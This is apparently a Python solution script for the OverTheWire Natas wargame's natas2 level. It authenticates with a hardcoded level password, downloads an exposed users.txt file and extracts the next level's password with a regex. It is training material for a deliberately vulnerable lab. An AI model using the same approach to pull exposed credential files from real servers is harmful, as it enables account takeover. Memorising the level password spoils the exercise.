#!/usr/bin/env python

import requests
import re

username = 'natas2'
password = 'TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI'

url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % username

try:
    response = requests.get(url, auth=(username, password))
    content = response.text

    # Uncomment the line below to print the entire content of the file
    # print(content)

    # Using regular expression to find the password for natas3
    matches = re.findall(r'natas3:(.*)', content)

    if matches:
        password_natas3 = matches[0].strip()  # Strip any leading or trailing whitespace
        print("Password for natas3:", password_natas3)
    else:
        print("Password for natas3 not found in the file.")
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
